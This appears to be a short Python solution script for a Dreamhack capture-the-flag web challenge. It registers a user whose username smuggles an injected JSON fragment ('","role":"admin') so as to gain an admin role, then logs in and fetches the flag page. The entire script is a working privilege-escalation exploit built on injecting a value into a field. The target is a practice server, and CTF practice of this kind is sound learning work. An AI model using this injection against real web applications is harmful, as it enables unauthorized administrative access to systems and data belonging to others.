import requests

url = "http://host3.dreamhack.games:18082/"

s = requests.Session()


res_regiter = s.post(f"{url}register",data={"username":'hello","role":"admin',"password":"hello"})
res_login = s.post(f"{url}login", data={"username":"hello","password":"hello"})
print(res_login.text)

res_flag = s.get(f"{url}flag")

print(res_flag.text)

